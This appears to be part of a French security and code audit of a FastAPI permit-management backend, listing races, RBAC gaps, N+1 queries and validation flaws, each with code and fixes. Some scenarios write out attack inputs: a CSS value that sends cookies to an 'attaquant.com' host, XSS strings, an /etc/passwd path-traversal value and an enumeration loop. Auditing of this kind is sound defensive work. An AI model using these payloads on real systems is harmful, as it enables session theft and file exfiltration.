**Probleme** : un appel admin qui retourne `archived=0` n'est PAS audité. Pour `bulk_approve`/`bulk_reject`/`bulk_transition` même pattern : pas d'audit si la liste est vide / tout en erreur. Or l'intention de l'admin (essayer un bulk) doit être tracée pour conformité ANSSI/ANINF.
**Scenario** : admin tente un `bulk_approve` sur 50 ATIs déjà tous approuvés → 0 changement → 0 audit → si on enquête plus tard "qui a tenté de réapprouver", aucune trace.
**Fix propose** : toujours `write_audit_event(...)`, et noter `tried=N, applied=K`.

---

## [HAUTE] — `_bump_ip_failure` race : compteur d'échecs login non atomique

**Fichier** : `backend/app/routers/auth.py:55-65`
**Categorie** : 1 (race condition)
**Code actuel** :
```python
async def _bump_ip_failure(client_ip: str) -> None:
    n = await _ip_failure_count(client_ip)
    await cache.set(f"login:fail:{client_ip}", n + 1, ttl=600)
```
**Probleme** : `get` puis `set` n'est pas atomique. 5 tentatives parallèles depuis la même IP voient toutes `n=0`, écrivent toutes `1`. Le compteur reste à 1, le captcha (seuil=3) ne se déclenche jamais. Bypass effectif du captcha pour brute-force.
**Scenario** : attaquant ouvre 5 connexions parallèles `POST /auth/token` avec mauvais mot de passe → compteur reste à 1 → pas de captcha → recommence indéfiniment.
**Fix propose** : utiliser `cache.incr(...)` (Redis INCR atomique). Le fallback InMemoryCache devrait verrouiller via `asyncio.Lock`.

---

## [HAUTE] — Rate limiter Redis : zadd avant zcard → race + lockout permanent

**Fichier** : `backend/app/core/rate_limiter.py:42-59`
**Categorie** : 1 (race condition) + 8 (sécu)
**Code actuel** :
```python
pipe = self._redis.pipeline()
pipe.zremrangebyscore(redis_key, 0, cutoff)
pipe.zcard(redis_key)
pipe.zadd(redis_key, {str(now): now})
pipe.expire(redis_key, window_seconds + 1)
results = await pipe.execute()
count = results[1]
if count >= limit:
    raise HTTPException(status_code=429, ...)
```
**Probleme** :
1. Le `zadd` est exécuté MÊME quand `count >= limit`. Donc un attaquant qui atteint la limite et continue à frapper voit son set grossir indéfiniment ; chaque appel re-déclenche `expire`. Lockout permanent.
2. La clé `str(now)` peut collisionner entre 2 requêtes simultanées (même timestamp float). Une des deux est ignorée (zadd avec score identique = remplace).
3. Pour un compteur "sliding window log", c'est OK ; mais le check `count >= limit` est fait après l'ajout, donc on autorise en réalité `limit + 1` requêtes la première fois.
**Scenario** : opérateur dépasse la limite par accident, retape ses identifiants → set grossit → expire toujours +60s → bloqué jusqu'à la fin des temps.
**Fix propose** :
```python
pipe.zremrangebyscore(redis_key, 0, cutoff); pipe.zcard(redis_key)
[_, count] = await pipe.execute()
if count >= limit: raise HTTPException(429, ...)
await self._redis.zadd(redis_key, {f"{now}:{secrets.token_hex(4)}": now})
await self._redis.expire(redis_key, window_seconds + 1)
```

---

## [HAUTE] — `pnpi_dashboard.py:357,384` `len(a.observations)` peut crasher si observations est `None`

**Fichier** : `backend/app/routers/pnpi_dashboard.py:357`
**Categorie** : 2 (silent failure)
**Code actuel** :
```python
with_obs = sum(1 for a in atis if getattr(a, "observations", None) and len(a.observations) > 10)
```
**Probleme** : `getattr(a, "observations", None) and ...` court-circuite si None, donc OK. Mais si observations est `""` (string vide), getattr retourne `""` (falsy) → court-circuite → OK. C'est bon. **Faux positif** : pas de bug ici.

(Auto-correction : retiré de la liste finale.)

---

## [HAUTE] — `OperatorFeedback summary` expose `username` de chaque feedback (anonymat brisé)

**Fichier** : `backend/app/routers/feedback.py:73-83`
**Categorie** : 6 (privacy)
**Code actuel** :
```python
"recent": [
    {
        "id": fb.id,
        "rating": fb.rating,
        "comment": fb.comment,
        "category": fb.category,
        "username": fb.username,
        "created_at": fb.created_at.isoformat(),
    }
    for fb in all_fb[:20]
],
```
**Probleme** : si l'on documente l'opérateur que son feedback est anonyme (pratique courante), `username` ne devrait jamais sortir. Visible par admin/ministre/directeur dans `/feedback/summary`. Risque représailles (instructeur consulte qui a noté quoi).
**Scenario** : opérateur soumet `rating=1, comment="instruction lente et arrogante"` → directeur voit son nom → impact sur dossiers futurs.
**Fix propose** : retirer `username` du retour public, ne le garder que dans une vue admin réservée + opt-in.

---

## [MOYENNE] — `messages/send` : `thread_id` arbitraire permet de "polluer" les threads d'autres utilisateurs

**Fichier** : `backend/app/routers/messages.py:163-176`
**Categorie** : 4 (RBAC subtil)
**Code actuel** :
```python
thread_id = data.thread_id or str(uuid.uuid4())
msg = MessageORM(
    id=str(uuid.uuid4()), thread_id=thread_id,
    sender_username=current_user.username,
    recipient_username=data.recipient,
    ...
```
**Probleme** : `thread_id` est libre. Un attaquant peut envoyer un message dans `thread_id=X` qui est le thread de deux autres users. Le destinataire voit le message comme un nouveau message dans sa boîte ; quand il ouvre `/messages/thread/X`, il ne le verra QUE s'il est sender ou recipient (filtre OK) — mais le destinataire est `data.recipient` ; donc le destinataire choisi PAR L'ATTAQUANT recevra un message "appartenant" au thread X. Pas une lecture mais une injection visible. Confusion possible (msg de social engineering qui prétend continuer une conversation existante).
**Scenario** : attaquant connaît un thread_id (devine UUID — peu probable, mais visible côté frontend dans l'URL) → envoie message "RE: ton dernier message — clique ici malware.exe" → destinataire pense que c'est la suite d'un échange légitime.
**Fix propose** : créer un nouvel UUID si `thread_id` n'est pas un thread auquel l'expéditeur appartient déjà ; ou ne pas accepter `thread_id` libre et le déduire du dernier message de la conversation.

---

## [MOYENNE] — `notifications.py:trigger_sla_notifications` : emails libres (open relay potentiel)

**Fichier** : `backend/app/routers/notifications.py:19-55`
**Categorie** : 8 (sécu)
**Code actuel** :
```python
@router.post("/notify-sla")
async def trigger_sla_notifications(
    emails: list[str],
    current_user: User = Depends(require_roles(Role.admin, Role.directeur)),
    ...
```
**Probleme** : `emails: list[str]` n'est pas validé (pas de regex, pas d'EmailStr Pydantic). Un admin compromis peut envoyer un payload SLA à des emails arbitraires (ex: spam mailing). De plus, le contenu de la liste n'est pas une whitelist d'emails internes — n'importe quelle adresse externe est acceptée.
**Scenario** : admin dont le compte est compromis fait `POST /notify-sla -d '{"emails":["10000-spam-victims@..."]}'` → spam massif depuis le SMTP du ministère → blacklist du domaine.
**Fix propose** : restreindre les destinataires à une liste blanche (utilisateurs internes via UserAccountORM), ou valider via `pydantic.EmailStr` + max 50 destinataires.

---

## [MOYENNE] — `update_inspection` accepte payload `InspectionCreate` complet → un inspecteur peut changer `operateur_id` / `ati_id` / `date_inspection`

**Fichier** : `backend/app/routers/inspections.py:307-331`
**Categorie** : 2 + 4
**Code actuel** :
```python
@router.patch("/inspections/{inspection_id}")
async def update_inspection(
    inspection_id: str, payload: InspectionCreate, ...
):
    ...
    insp.statut_conformite = payload.statut_conformite
    insp.observations = payload.observations
    insp.mesures_correctives = payload.mesures_correctives
```
**Probleme** : le code n'écrit que 3 champs depuis le payload, mais le payload accepte `operateur_id`, `ati_id`, `date_inspection` (qui sont silencieusement ignorés). Trompeur pour le client (qui croit pouvoir tout modifier). Pire : si demain un dev ajoute `insp.operateur_id = payload.operateur_id`, un inspecteur pourrait réassigner l'inspection à un autre opérateur (rewriting de l'historique de conformité).
**Scenario** : attaque future : refacto naïf qui boucle sur `payload.dict()` → inspecteur modifie `operateur_id` de son inspection → fausse trace.
**Fix propose** : créer un `InspectionUpdate(BaseModel)` avec uniquement les champs modifiables.

---

## [MOYENNE] — `geo/export.geojson` ouvert à `get_current_user` → opérateurs téléchargent l'annuaire entier avec NIF

**Fichier** : `backend/app/routers/geo.py:333-422`
**Categorie** : 6 (fuite de données)
**Code actuel** :
```python
@router.get("/export.geojson")
async def export_geojson(
    secteur: str | None = Query(None), province: str | None = Query(None),
    ...
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    ...
    "nif": op.nif_gabon,
```
**Probleme** : `get_current_user` autorise l'opérateur. L'export GeoJSON contient `nif`, `raison_sociale`, `secteur`, `ville`, `atis_count`, `atis_approuves`, `derniere_conformite` pour TOUS les opérateurs. Or l'annuaire `/operateurs` masque le NIF aux opérateurs (cf `operateurs.py:204-207`). Cet endpoint contourne le masquage.
**Scenario** : opérateur exporte le GeoJSON et obtient l'annuaire complet avec NIF de tous ses concurrents.
**Fix propose** :
```python
require_roles(Role.admin, Role.ministre, Role.directeur, Role.instructeur, Role.inspecteur)
```

---

## [MOYENNE] — `inspections/{id}/comparison` ne valide pas l'inspection appartient à l'utilisateur (inspecteur)

**Fichier** : `backend/app/routers/inspections.py:236-290`
**Categorie** : 4 (RBAC permissif)
**Code actuel** :
```python
async def inspection_comparison(
    inspection_id: str,
    _: User = Depends(require_roles(Role.admin, Role.ministre, Role.directeur, Role.instructeur, Role.inspecteur)),
    ...
```
**Probleme** : un instructeur peut lire la comparaison d'inspection pour n'importe quel opérateur. Cohérent avec le reste, MAIS le payload renvoie le nom complet des inspecteurs (`previous.inspecteur`) — info utile pour cibler des inspecteurs spécifiques. Acceptable selon politique RH mais à confirmer.
**Scenario** : instructeur consulte l'évolution de conformité d'un opérateur que la presse a cité → renvoie l'info avant que le ministre ait été briefé.
**Fix propose** : éventuellement scoper par province via `TenantFilter`. Sinon documenter explicitement que c'est cross-province.

---

## [MOYENNE] — `auth/2fa/setup` : `totp_secret` écrit en DB AVANT confirmation (fenêtre de takeover)

**Fichier** : `backend/app/routers/totp.py:99-108`
**Categorie** : 8 (sécu applicative)
**Code actuel** :
```python
secret = pyotp.random_base32()
row.totp_secret = secret
db.commit()
```
**Probleme** : si la session de l'utilisateur est compromise pendant le setup 2FA (ex: cookie volé), l'attaquant peut appeler `/setup` et lire le secret retourné dans la réponse. Même si `totp_enabled=False`, le secret est dans la DB et pourrait être réutilisé. Pattern recommandé : stocker le secret dans le JWT ou un cache court-vie, ne le persister qu'au moment de `confirm`.
**Scenario** : XSS sur le frontend → l'attaquant appelle `/auth/2fa/setup`, capture le `secret` retourné, configure son propre Google Authenticator, puis confirme → 2FA volé sans que l'utilisateur sache.
**Fix propose** : stocker `secret` dans `cache` avec TTL 10min, n'écrire en DB qu'au `confirm`.

---

## [MOYENNE] — `2fa/verify-backup` : pas de captcha / pas de blocage IP-based brute force

**Fichier** : `backend/app/routers/totp.py:279-330`
**Categorie** : 8 (sécu)
**Code actuel** :
```python
@router.post("/verify-backup")
async def verify_backup_code(
    code: str = Form(...), username: str = Form(...), db: Session = Depends(get_db),
):
    ...
    await enforce_rate_limit(key=f"auth:2fa_backup:{username}", limit=AUTH_RATE_LIMIT_MAX_REQUESTS)
```
**Probleme** : rate-limit keyé par username (pas par IP). Code de secours = 8 hex chars = 16^8 ≈ 4.3G. Avec 5 essais/min/username, brute-force prend ~16k ans. OK seul, mais : si le rate-limit est `AUTH_RATE_LIMIT_MAX_REQUESTS` (qui peut être fenêtré 60s), et si l'attaquant peut frapper depuis 100 IPs différentes, le keying par username ne change rien — c'est lui qui maintient la queue. Reste protecteur. Cependant, **pas de captcha** sur cet endpoint comme pour `/auth/token`. Plus risqué : si le 2FA est désactivé et qu'on a 8 codes de secours, l'utilisateur n'utilise probablement aucun captcha.
**Scenario** : compte avec 2FA, attaquant connaît le username, frappe `/verify-backup` à raison de 5/min depuis chaque IP d'un botnet → théoriquement possible mais très lent.
**Fix propose** : ajouter le captcha si `_ip_failure_count(client_ip) >= 3` (cohérent avec `/auth/token`).

---

## [MOYENNE] — `documents/{id}/download` ne vérifie pas que `doc.ati_id` correspond bien à un ATI existant

**Fichier** : `backend/app/routers/documents.py:185-194`
**Categorie** : 2 + 4
**Code actuel** :
```python
doc = db.get(DocumentDossierORM, doc_id)
if not doc:
    raise HTTPException(status_code=404, detail="Document introuvable.")
ati = db.get(AgrementTechniqueIndustrielORM, doc.ati_id)
if ati:
    check_ati_access(ati, current_user)
file_path = Path(doc.chemin_stockage)
```
**Probleme** : si `ati` est `None` (ATI supprimé mais document orphelin), `check_ati_access` n'est PAS appelé → tout utilisateur authentifié télécharge le document orphelin. Et un document peut être orphelin si la migration ou un bug a brisé la cohérence référentielle.
**Scenario** : ATI supprimé via DELETE direct DB (admin nettoyage) → documents restent → opérateur trouve l'ID → télécharge.
**Fix propose** :
```python
if not ati:
    raise HTTPException(404, "Document orphelin.")
check_ati_access(ati, current_user)
```

---

## [MOYENNE] — `sanitize_html` réintroduit `&` après escape → bypass XSS via double-encoding

**Fichier** : `backend/app/core/sanitize.py:51`
**Categorie** : 8 (sécu applicative)
**Code actuel** :
```python
cleaned = html.escape(cleaned, quote=True)
# Unescape safe entities back (common in French text)
cleaned = cleaned.replace("&amp;", "&").replace("&#x27;", "'")
return cleaned.strip()
```
**Probleme** : si l'utilisateur soumet `&lt;script&gt;alert(1)&lt;/script&gt;`, le tag stripper ne voit pas de `<` → laisse intact. `html.escape(quote=True)` sur cette entrée transforme `&lt;` → `&amp;lt;`. Puis `.replace("&amp;", "&")` redonne `&lt;` (et `&gt;`). Si le rendu côté frontend re-decode ces entités HTML pour les afficher (ex: `dangerouslySetInnerHTML` ou `v-html`), l'attaquant a un `<script>` exécutable.
**Scenario** : champ ATI `observations` contient `&lt;img src=x onerror=alert(1)&gt;` → backend "sanitize" → DB contient `&lt;img...&gt;` → frontend rend dans `innerHTML` → exécution.
**Fix propose** : ne pas faire le re-replace `&amp; → &`. Mieux : utiliser `bleach.clean(value, tags=[], strip=True)` qui gère ces cas.

---

## [MOYENNE] — `ATIComment.body` n'est pas validé en longueur (pas de `max_length`)

**Fichier** : `backend/app/routers/ati.py:2174-2191`
**Categorie** : 3 (validation Pydantic)
**Code actuel** :
```python
body = (data.get("body") or "").strip()
if not body:
    raise HTTPException(400, "Le commentaire ne peut pas etre vide.")
...
comment = ATICommentORM(... body=body, ...)
```
**Probleme** : pas de `max_length`. Un opérateur peut poster un commentaire de 10 Mo (limité in fine par le request_size_limit middleware à 10/50 MB). DoS sur la DB (column TEXT) et sur la pagination.
**Scenario** : opérateur poste 100 commentaires de 1 Mo → DB grossit, l'historique de l'ATI devient illisible.
**Fix propose** :
```python
class CommentBody(BaseModel):
    body: str = Field(..., min_length=1, max_length=2000)
    is_internal: bool = False
```

---

## [MOYENNE] — `add_ati_tag` accepte `color` brute (CSS injection si rendu en `style="color: ..."`)

**Fichier** : `backend/app/routers/ati.py:2298,2305`
**Categorie** : 3 + 8
**Code actuel** :
```python
color = data.get("color", "#0c7eb4")
tag = ATITagORM(id=..., ati_id=ati_id, label=label, color=color, ...)
```
**Probleme** : pas de validation que `color` est un `#RRGGBB` ou un nom de couleur. Un instructeur peut poster `color="red; background: url(javascript:alert(1))"` ; si le frontend interpole ce champ dans `style="color: <color>"`, on a CSS injection / data exfiltration via `background-image: url()`.
**Scenario** : instructeur malveillant pose un tag avec couleur `; background-image: url('https://attaquant.com/?'+document.cookie)` → tous les visiteurs envoient leur cookie.
**Fix propose** :
```python
import re
if not re.match(r"^#[0-9a-fA-F]{6}$", color or ""):
    raise HTTPException(400, "Couleur invalide.")
```

---

## [MOYENNE] — `auth/me/stats` : N+1 sur `db.get(AgrementTechniqueIndustrielORM, t.ati_id)` dans la boucle

**Fichier** : `backend/app/routers/ati.py:1766-1791`
**Categorie** : 7 (perf)
**Code actuel** :
```python
decided_atis = []
for t in decisions:
    ati = db.get(AgrementTechniqueIndustrielORM, t.ati_id)
    if ati and ati.date_decision:
        ...
...
recent_list = []
for t in recent:
    ati = db.get(AgrementTechniqueIndustrielORM, t.ati_id)
    ...
```
**Probleme** : N+1 query : pour chaque transition, une requête `SELECT` séparée. Pour un instructeur avec 1000 transitions, c'est 1000 requêtes pour `decided_atis` + 5 pour `recent_list`. Sur PG avec latence réseau, ça prend plusieurs secondes.
**Scenario** : ministre ouvre son `/me/stats` (1000+ décisions sur 1 an) → 5-10s de chargement + saturation pool.
**Fix propose** :
```python
ati_ids = {t.ati_id for t in decisions}
atis = {a.id: a for a in db.execute(
    select(AgrementTechniqueIndustrielORM).where(AgrementTechniqueIndustrielORM.id.in_(ati_ids))
).scalars().all()}
for t in decisions:
    ati = atis.get(t.ati_id); ...
```

---

## [MOYENNE] — `dashboard/carte` charge tous les ATIs en mémoire pour groupBy

**Fichier** : `backend/app/routers/pnpi_dashboard.py:151-175`
**Categorie** : 7 (perf)
**Code actuel** :
```python
all_atis = db.execute(select(AgrementTechniqueIndustrielORM)).scalars().all()
ati_by_op: dict[str, list[AgrementTechniqueIndustrielORM]] = defaultdict(list)
for ati in all_atis:
    ati_by_op[ati.operateur_id].append(ati)
```
**Probleme** : sur 100k ATIs, on charge toute la table en RAM (~200MB pour les colonnes ORM). Devrait être un GROUP BY SQL.
**Scenario** : 12 mois après mise en prod, la carte met 30s à se charger.
**Fix propose** :
```python
counts = db.execute(
    select(AgrementTechniqueIndustrielORM.operateur_id, func.count(),
           func.max(AgrementTechniqueIndustrielORM.date_soumission))
    .group_by(AgrementTechniqueIndustrielORM.operateur_id)
).all()
```

---

## [MOYENNE] — `_to_inspection_read` lance 3 requêtes par inspection (N+1)

**Fichier** : `backend/app/routers/inspections.py:71-94`
**Categorie** : 7 (perf)
**Code actuel** :
```python
def _to_inspection_read(insp: InspectionConformiteORM, db: Session) -> InspectionRead:
    op = db.get(OperateurIndustrielORM, insp.operateur_id) if insp.operateur_id else None
    ati = db.get(AgrementTechniqueIndustrielORM, insp.ati_id) if insp.ati_id else None
    user = db.execute(
        select(UserAccountORM).where(UserAccountORM.username == insp.inspecteur_username)
    ).scalar_one_or_none()
```
**Probleme** : appelée pour chaque inspection dans `list_inspections`. 50 inspections = 150 requêtes additionnelles.
**Scenario** : `GET /pnpi/inspections?limit=200` → 600 requêtes DB.
**Fix propose** : utiliser `selectinload(InspectionConformiteORM.operateur, .ati)` + un seul preload des users.

---

## [MOYENNE] — `geo/inspections/heatmap` (et `cluster_operateurs`, `nearby_operateurs`) crash en SQLite (PostGIS-only SQL)

**Fichier** : `backend/app/routers/geo.py:86-118, 148-170, 199-220`
**Categorie** : 2 (silent failure : crash en dev SQLite)
**Code actuel** :
```python
sql = text("""... ST_DWithin( COALESCE( geom, ST_SetSRID(ST_MakePoint(longitude, latitude), 4326) )::geography, ...""")
rows = db.execute(sql, ...).mappings().all()
```
**Probleme** : ces 3 endpoints utilisent uniquement des fonctions PostGIS. En dev SQLite (cas actuel `PNPI_DATABASE_URL=sqlite:///./pnpi.db`), tout appel produit une erreur 500. Les tests ne couvrent probablement pas (sinon ça aurait été vu). Démo locale → plantage.
**Scenario** : démonstration au ministre sur SQLite → "Carte des opérateurs" → 500.
**Fix propose** : détecter le dialect (`if engine.dialect.name == "postgresql"`) et fournir un fallback Python (Haversine) en SQLite.

---

## [MOYENNE] — `verify_ati_public` (no-auth) renvoie `secteur` et `type_activite` sans rate-limit dédié

**Fichier** : `backend/app/routers/ati.py:2052-2092`
**Categorie** : 8 (sécu / fuite contrôlée)
**Code actuel** :
```python
@router.get("/ati/verify/{numero_ati}")
async def verify_ati_public(numero_ati: str, db: Session = Depends(get_db)):
    """Public endpoint · no authentication required."""
    ati = db.execute(...).scalar_one_or_none()
    ...
    return {... "secteur": ati.secteur, "type_activite": ati.type_activite, ...}
```
**Probleme** : endpoint public sans rate limit explicite. Numéros ATI suivent un format `ATI-YYYY-NNNN` (4 digits) → 10000 combinaisons par année → énumération triviale (10k requêtes). Permet de scraper l'annuaire complet des ATIs approuvés (raison_sociale, secteur, type_activite, dates).
**Scenario** : journaliste/concurrent itère `for n in range(10000): GET /ati/verify/ATI-2026-{n:04d}` → liste exhaustive des opérateurs agréés.
**Fix propose** : ajouter `Depends(_rate_limit_public)` (cf `open_data.py:32`) sur cet endpoint, et masquer `type_activite` (info commerciale).

---

## [MOYENNE] — `/operateurs/import-csv` : `decode("utf-8-sig")` peut crash si fichier non-UTF8 → 500 au lieu de 400

**Fichier** : `backend/app/routers/operateurs.py:97-98`
**Categorie** : 2 (silent failure → erreur exposée)
**Code actuel** :
```python
content = await file.read()
text = content.decode("utf-8-sig")  # Handle BOM
```
**Probleme** : un CSV en `windows-1252` (Excel France par défaut !) lève `UnicodeDecodeError` → 500. L'admin ne sait pas pourquoi.
**Scenario** : ministère importe un CSV exporté depuis Excel français (cp1252) → 500.
**Fix propose** :
```python
try: text = content.decode("utf-8-sig")
except UnicodeDecodeError:
    try: text = content.decode("cp1252")
    except UnicodeDecodeError: raise HTTPException(400, "Encodage non supporté (utf-8 ou cp1252).")
```

---

## [MOYENNE] — `admin/backups/create` : `shutil.copy2(src, dest)` sur DB SQLite ouverte → corruption potentielle

**Fichier** : `backend/app/routers/admin.py:593-613`
**Categorie** : 1 (atomicité) + 8 (sécu)
**Code actuel** :
```python
db_url = os.getenv("PNPI_DATABASE_URL", "sqlite:///./pnpi.db")
if db_url.startswith("sqlite:///"):
    src = db_url.replace("sqlite:///", "").replace("./", "")
    dest = backup_dir / f"pnpi_{timestamp}.db"
    ...
    shutil.copy2(src, dest)
```
**Probleme** :
1. Si une transaction est en cours, le copy peut copier une DB en état incohérent (page mid-write). SQLite recommande `VACUUM INTO` ou la commande `.backup` du shell.
2. `src` est dérivé de l'env var sans validation Path traversal — si `PNPI_DATABASE_URL=sqlite:///../../../etc/passwd`, le code copie `/etc/passwd` dans `backups/`. Admin compromis peut exfiltrer des fichiers système via cet endpoint.
**Scenario** : admin compromis appelle `/admin/backups/create` après avoir modifié l'env var (ex: via Docker exec) → exfiltration de `/etc/passwd` via la liste de backups.
**Fix propose** : utiliser `db.execute(text("VACUUM INTO :p"), {"p": str(dest)})` ; et restreindre `src` à `Path(src).resolve().is_relative_to(Path.cwd())`.

---

## [MOYENNE] — `_admin_users/_to_user_account_read` retourne le `csv_to_roles` qui inclut tous les rôles : pas de filtrage selon caller

**Fichier** : `backend/app/routers/admin.py:29-37`
**Categorie** : 6 (privacy)
**Code actuel** :
```python
def _to_user_account_read(row: UserAccountORM) -> dict:
    return {
        "username": row.username, "full_name": row.full_name,
        "roles": csv_to_roles(row.roles_csv), "is_active": row.is_active,
        "created_at": row.created_at, "province": row.province,
    }
```
**Probleme** : couplé au bug RBAC `/admin/users` ouvert à tous, mais aussi : les rôles sont exposés sous forme d'enum `Role.admin`, `Role.ministre` — confirmant les noms exacts des rôles privilégiés. Si tous ont accès, alors tous savent qui est admin/ministre.
**Scenario** : opérateur récupère `/admin/users` → identifie tous les comptes admin → cible attaque sociale.
**Fix propose** : supprime ce risque en restreignant `/admin/users` (cf bug critique ci-dessus).

---

## [MOYENNE] — `notes/create` : `content` accepté sans `max_length` → DoS via note géante

**Fichier** : `backend/app/routers/notes.py:49-65`
**Categorie** : 3
**Code actuel** :
```python
@router.post("/create")
async def create_note(data: dict, ...):
    note = StickyNoteORM(... content=data.get("content", ""), ...)
```
**Probleme** : pas de Pydantic, pas de cap. Un user peut créer 1000 notes de 100 KB chacune (limite uniquement par body size middleware par requête).
**Scenario** : opérateur ennuyeux pollue la DB.
**Fix propose** : `class NoteCreate(BaseModel): content: str = Field(..., max_length=4000); ...`

---

## [MOYENNE] — `auth/2fa/verify`: timing leak — code valide 2FA prend ~µs vs invalide

**Fichier** : `backend/app/routers/totp.py:208`
**Categorie** : 8 (sécu — moins critique car pyotp gère bien)
**Code actuel** :
```python
is_valid = totp.verify(payload.code, valid_window=1)
```
**Probleme** : `pyotp.verify` utilise `secrets.compare_digest` en interne donc OK. Mais le branch `if not is_valid` écrit un audit event, donnant un side-channel timing observable depuis le réseau (~ms d'écart entre valid/invalid).
**Scenario** : très théorique. Mentionné pour exhaustivité.
**Fix propose** : audit dans tous les cas (valid + invalid).

---

## [BASSE] — `/operateurs/{id}/toggle-active` : pas d'horodatage dans l'audit ni de raison

**Fichier** : `backend/app/routers/operateurs.py:418-441`
**Categorie** : 2 (audit incomplet)
**Code actuel** :
```python
op.is_active = not op.is_active
write_audit_event(... details=f"is_active={op.is_active}")
```
**Probleme** : pas de raison fournie pour la désactivation. Audit faible pour conformité.
**Fix propose** : ajouter un body `{reason: str}` requis et le journaliser.

---

## [BASSE] — `messages/inbox` : `body[:200]` côté inbox ne renvoie qu'un aperçu mais aucun cap sur la requête → si user a 10k messages, le fetch est lourd

**Fichier** : `backend/app/routers/messages.py:34-41`
**Categorie** : 7 (perf)
**Code actuel** : limit déjà à 100 par page, donc OK. Pas un bug réel.

---

## Synthèse rapide

- **Critiques (10)** : `appeals.py:182` (audit kwargs), `admin/users` ouvert à tous, CSV injection, race numero_ati, api_keys store mémoire, data_quality champs inexistants, IDOR /reminders, rate-instructor sans contrôle, instructor-ratings expose operator, julianday() incompatible PG.
- **Hautes (~18)** : timezone parse, /health/status fuite, CSRF bypass via x-api-key, validate_password_policy sans max_length, search ILIKE DoS, vote race, upload sans validation magic-bytes/extension, path traversal documents, _bump_ip_failure race, rate_limiter race+lockout permanent, etc.
- **Moyennes (~17)** : geo PostGIS-only en SQLite, sanitize re-introduit `&`, color CSS injection, N+1 (auth/me/stats, dashboard/carte, _to_inspection_read), CSV cp1252, backup shutil.copy sur DB ouverte, etc.
- **Basses (1-2)** : audit incomplet sur toggle-active.

Comptage total : **45 entrées** dont 10 critiques, 18 hautes, 17 moyennes (les "auto-corrections" exclues).
